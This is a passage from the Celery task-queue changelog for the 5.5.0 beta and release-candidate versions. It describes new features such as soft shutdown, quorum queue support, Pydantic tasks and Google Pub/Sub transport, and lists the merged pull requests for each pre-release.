option.\n\nNew support for Google Pub/Sub transport\n----------------------------------------\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues:\n`#9351 <https://github.com/celery/celery/pull/9351>`_\n\nPython 3.13 Improved Support\n----------------------------\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Document usage of broker_native_delayed_delivery_queue_type (#9419)\n- Adjust section in what's new document regarding quorum queues support (#9420)\n- Update pytest-rerunfailures to 15.0 (#9422)\n- Document group unrolling (#9421)\n- fix small typo acces -> access (#9434)\n- Update cryptography to 44.0.0 (#9437)\n- Added pypy to Dockerfile (#9438)\n- Skipped flaky tests on pypy (all pass after ~10 reruns) (#9439)\n- Allowing managed credentials for azureblockblob (#9430)\n- Allow passing Celery objects to the Click entry point (#9426)\n- support Request termination for gevent (#9440)\n- Prevent event_mask from being overwritten. (#9432)\n- Update pytest to 8.3.4 (#9444)\n- Prepare for (pre) release: v5.5.0rc3 (#9450)\n\n.. _version-5.5.0rc2:\n\n5.5.0rc2\n========\n\n:release-date: 2024-11-18\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Release Candidate 2 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nSee :ref:`whatsnew-5.5` or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n--------------------\n\nThe minimum required Kombu version has been bumped to 5.5.0.\nKombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n------------------------------\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues:\n`#9207 <https://github.com/celery/celery/discussions/9207>`_,\n`#6067 <https://github.com/celery/celery/discussions/6067>`_\n\n- New :ref:`documentation <using-quorum-queues>`.\n- New :setting:`broker_native_delayed_delivery_queue_type` configuration option.\n\nNew support for Google Pub/Sub transport\n----------------------------------------\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues:\n`#9351 <https://github.com/celery/celery/pull/9351>`_\n\nPython 3.13 Improved Support\n----------------------------\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nPrevious Pre-release Highlights\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPython 3.13 Initial Support\n---------------------------\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Fix: Treat dbm.error as a corrupted schedule file (#9331)\n- Pin pre-commit to latest version 4.0.1 (#9343)\n- Added Python 3.13 to Dockerfiles (#9350)\n- Skip test_pool_restart_import_modules on PyPy due to test issue (#9352)\n- Update elastic-transport requirement from <=8.15.0 to <=8.15.1 (#9347)\n- added dragonfly logo (#9353)\n- Update README.rst (#9354)\n- Update README.rst (#9355)\n- Update mypy to 1.12.0 (#9356)\n- Bump Kombu to v5.5.0rc1 (#9357)\n- Fix `celery --loader` option parsing (#9361)\n- Add support for Google Pub/Sub transport (#9351)\n- Add native incr support for GCSBackend (#9302)\n- fix(perform_pending_operations): prevent task duplication on shutdown… (#9348)\n- Update grpcio to 1.67.0 (#9365)\n- Update google-cloud-firestore to 2.19.0 (#9364)\n- Annotate celery/utils/timer2.py (#9362)\n- Update cryptography to 43.0.3 (#9366)\n- Update mypy to 1.12.1 (#9368)\n- Bump mypy from 1.12.1 to 1.13.0 (#9373)\n- Pass timeout and confirm_timeout to producer.publish() (#9374)\n- Bump Kombu to v5.5.0rc2 (#9382)\n- Bump pytest-cov from 5.0.0 to 6.0.0 (#9388)\n- default strict to False for pydantic tasks (#9393)\n- Only log that global QoS is disabled if using amqp (#9395)\n- chore: update sponsorship logo (#9398)\n- Allow custom hostname for celery_worker in celery.contrib.pytest / celery.contrib.testing.worker (#9405)\n- Removed docker-docs from CI (optional job, malfunctioning) (#9406)\n- Added a utility to format changelogs from the auto-generated GitHub release notes (#9408)\n- Bump codecov/codecov-action from 4 to 5 (#9412)\n- Update elasticsearch requirement from <=8.15.1 to <=8.16.0 (#9410)\n- Native Delayed Delivery in RabbitMQ (#9207)\n- Prepare for (pre) release: v5.5.0rc2 (#9416)\n\n.. _version-5.5.0rc1:\n\n5.5.0rc1\n========\n\n:release-date: 2024-10-08\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Release Candidate 1 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nSee :ref:`whatsnew-5.5` or read the main highlights below.\n\nPython 3.13 Initial Support\n---------------------------\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Added Blacksmith.sh to the Sponsors section in the README (#9323)\n- Revert \"Added Blacksmith.sh to the Sponsors section in the README\" (#9324)\n- Added Blacksmith.sh to the Sponsors section in the README (#9325)\n- Added missing \" |oc-sponsor-3|” in README (#9326)\n- Use Blacksmith SVG logo (#9327)\n- Updated Blacksmith SVG logo (#9328)\n- Revert \"Updated Blacksmith SVG logo\" (#9329)\n- Update pymongo to 4.10.0 (#9330)\n- Update pymongo to 4.10.1 (#9332)\n- Update user guide to recommend delay_on_commit (#9333)\n- Pin pre-commit to latest version 4.0.0 (Python 3.9+) (#9334)\n- Update ephem to 4.1.6 (#9336)\n- Updated Blacksmith SVG logo (#9337)\n- Prepare for (pre) release: v5.5.0rc1 (#9341)\n\n.. _version-5.5.0b4:\n\n5.5.0b4\n=======\n\n:release-date: 2024-09-30\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 4 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nPython 3.13 Initial Support\n---------------------------\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nPrevious Pre-release Highlights\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Correct the error description in exception message when validate soft_time_limit (#9246)\n- Update msgpack to 1.1.0 (#9249)\n- chore(utils/time.py): rename `_is_ambigious` -> `_is_ambiguous` (#9248)\n- Reduced Smoke Tests to min/max supported python (3.8/3.12) (#9252)\n- Update pytest to 8.3.3 (#9253)\n- Update elasticsearch requirement from <=8.15.0 to <=8.15.1 (#9255)\n- Update mongodb without deprecated `[srv]` extra requirement (#9258)\n- blacksmith.sh: Migrate workflows to Blacksmith (#9261)\n- Fixes #9119: inject dispatch_uid for retry-wrapped receivers (#9247)\n- Run all smoke tests CI jobs together (#9263)\n- Improve documentation on visibility timeout (#9264)\n- Bump pytest-celery to 1.1.2 (#9267)\n- Added missing \"app.conf.visibility_timeout\" in smoke tests (#9266)\n- Improved stability with t/smoke/tests/test_consumer.py (#9268)\n- Improved Redis container stability in the smoke tests (#9271)\n- Disabled EXHAUST_MEMORY tests in Smoke-tasks (#9272)\n- Marked xfail for test_reducing_prefetch_count with Redis - flaky test (#9273)\n- Fixed pypy unit tests random failures in the CI (#9275)\n- Fixed more pypy unit tests random failures in the CI (#9278)\n- Fix Redis container from aborting randomly (#9276)\n- Run Integration & Smoke CI tests together after unit tests pass (#9280)\n- Added \"loglevel verbose\" to Redis containers in smoke tests (#9282)\n- Fixed Redis error in the smoke tests: \"Possible SECURITY ATTACK detected\" (#9284)\n- Refactored the smoke tests github workflow (#9285)\n- Increased --reruns 3->4 in smoke tests (#9286)\n- Improve stability of smoke tests (CI and Local) (#9287)\n- Fixed Smoke tests CI \"test-case\" labels (specific instead of general) (#9288)\n- Use assert_log_exists instead of wait_for_log in worker smoke tests (#9290)\n- Optimized t/smoke/tests/test_worker.py (#9291)\n- Enable smoke tests dockers check before each test starts (#9292)\n- Relaxed smoke tests flaky tests mechanism (#9293)\n- Updated quorum queue detection to handle multiple broker instances (#9294)\n- Non-lazy table creation for database backend (#9228)\n- Pin pymongo to latest version 4.9 (#9297)\n- Bump pymongo from 4.9 to 4.9.1 (#9298)\n- Bump Kombu to v5.4.2 (#9304)\n- Use rabbitmq:3 in stamping smoke tests (#9307)\n- Bump pytest-celery to 1.1.3 (#9308)\n- Added Python 3.13 Support (#9309)\n- Add log when global qos is disabled (#9296)\n- Added official release docs (whatsnew) for v5.5 (#9312)\n- Enable Codespell autofix (#9313)\n- Pydantic typehints: Fix optional, allow generics (#9319)\n- Prepare for (pre) release: v5.5.0b4 (#9322)\n\n.. _version-5.5.0b3:\n\n5.5.0b3\n=======\n\n:release-date: 2024-09-08\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 3 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPrevious Pre-release Highlights\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Added SQS (localstack) broker to canvas smoke tests (#9179)\n- Pin elastic-transport to <= latest version 8.15.0 (#9182)\n- Update elasticsearch requirement from <=8.14.0 to <=8.15.0 (#9186)\n- Improve formatting (#9188)\n- Add basic helm chart for celery (#9181)\n- Update kafka.rst (#9194)\n- Update pytest-order to 1.3.0 (#9198)\n- Update mypy to 1.11.2 (#9206)\n- All added to routes (#9204)\n- Fix typos discovered by codespell (#9212)\n- Use tzdata extras with zoneinfo backports (#8286)\n- Use `docker compose` in Contributing's doc build section (#9219)\n- Failing test for issue #9119 (#9215)\n- Fix date_done timezone issue (#8385)\n- CI Fixes to smoke tests (#9223)\n- Fix: passes current request context when pushing to request_stack (#9208)\n- Fix broken link in the Using RabbitMQ docs page (#9226)\n- Added Soft Shutdown Mechanism (#9213)\n- Added worker_enable_soft_shutdown_on_idle (#9231)\n- Bump cryptography from 43.0.0 to 43.0.1 (#9233)\n- Added docs regarding the relevancy of soft shutdown and ETA tasks (#9238)\n- Show broker_connection_retry_on_startup warning only if it evaluates as False (#9227)\n- Fixed docker-docs CI failure (#9240)\n- Added docker cleanup auto-fixture to improve smoke tests stability (#9243)\n- print is not thread-safe, so should not be used in signal handler (#9222)\n- Prepare for (pre) release: v5.5.0b3 (#9244)\n\n.. _version-5.5.0b2:\n\n5.5.0b2\n=======\n\n:release-date: 2024-08-06\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 2 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nPrevious Beta Highlights\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Bump pytest from 8.3.1 to 8.3.2 (#9153)\n- Remove setuptools deprecated test command from setup.py (#9159)\n- Pin pre-commit to latest version 3.8.0 from Python 3.9 (#9156)\n- Bump mypy from 1.11.0 to 1.11.1 (#9164)\n- Change \"docker-compose\" to \"docker compose\" in Makefile (#9169)\n- update python versions and docker compose (#9171)\n- Add support for Pydantic model validation/serialization (fixes #8751) (#9023)\n- Allow local dynamodb to be installed on another host than localhost (#8965)\n- Terminate job implementation for gevent concurrency backend (#9083)\n- Bump Kombu to v5.4.0 (#9177)\n- Add check for soft_time_limit and time_limit values (#9173)\n- Prepare for (pre) release: v5.5.0b2 (#9178)\n\n.. _version-5.5.0b1:\n\n5.5.0b1\n=======\n\n:release-date: 2024-07-24\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 1 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new\nKombu RC version, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- (docs): use correct version celery v.5.4.x (#8975)\n- Update mypy to 1.10.0 (#8977)\n- Limit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (#8988)\n- Bump pytest from 8.1.1 to 8.2.0 (#8987)\n- Update README to Include FastAPI in Framework Integration Section (#8978)\n- Clarify return values of ..._on_commit methods (#8984)\n- add kafka broker docs (#8935)\n- Limit pymongo<4.7 regardless of Python version (#8999)\n- Update pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (#9000)\n- Update elasticsearch requirement from <=8.13.0 to <=8.13.1 (#9004)\n- security: SecureSerializer: support generic low-level serializers (#8982)\n- don't kill if pid same as file (#8997) (#8998)\n- Update cryptography to 42.0.6 (#9005)\n- Bump cryptography from 42.0.6 to 42.0.7 